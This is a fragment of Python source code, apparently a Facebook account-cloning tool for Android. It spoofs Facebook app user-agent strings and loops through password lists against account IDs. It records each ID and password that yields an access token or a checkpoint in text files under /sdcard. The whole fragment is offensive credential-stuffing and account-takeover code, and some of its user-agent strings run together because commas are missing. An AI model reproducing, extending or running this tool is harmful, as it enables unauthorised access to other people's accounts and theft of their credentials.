...
class OLD_CLONER:
    ...
    def ugen(self):
        ua_list = [
        "[FBAN/FB4A;FBAV/60.0.0.16.76;FBBV/20454115;FBDM/{density=2.0,width=720,height=1280};FBLC/ar_AR;FBCR/Orange;FBMF/infinix;FBBD/INFINIX;FBPN/com.facebook.katana;FBDV/Infinix HOT 3;FBSV/5.1;nullFBCA/armeabi-v7a:armeabi;]"
        "Davik/2.1.0 (Linux; U; Android 9.0.1; SM-A205YN Build/QP1A.190711.020; wv) [FBAN/FB4A;FBAV/736.0.0.28.593;FBBV/458136061;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_GB;FBCR/Tele2;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.orca;FBDV/SM-A205YN;FBSV/5.0;nullFBCA/armeabi-v7a:armeabi;]"
        "Davik/2.1.0 (Linux; U; Android 14.0.1; SM-A205YN Build/QP1A.190711.020; wv) [FBAN/FB4A;FBAV/854.0.0.88.228;FBBV/680964502;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_GB;FBCR/Tele2;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.orca;FBDV/SM-A205YN;FBSV/5.0;nullFBCA/armeabi-v7a:armeabi;]",
    ...
    def CloneOld(self,ids,passlist):
        global loop,oks,cps
        sys.stdout.write(f"\r\r\x1b[mMaNi-XD {self.loop}|ASHISH|OK:{len(self.oks)}|CP:{len(self.cps)}")
        sys.stdout.flush()
        try:
            for pas in passlist:
                data = {
                ...
                if "access_token" in response:
                    ...
                    open("/sdcard/MaNi-OLD-OK.txt","a").write(ids+"|"+pas+"\n")
                    self.oks.append(ids)
                    break
                elif "www.facebook.com" in response["error"]["message"]:
                    print(f"\r\r\x1b[38;5;196mOLD-CP • {ids} • {pas}")
                    open("/sdcard/MaNi-OLD-CP.txt","a").write(ids+"|"+pas+"\n")
                    self.cps.append(ids)
                    break
                else:continue
            self.loop += 1
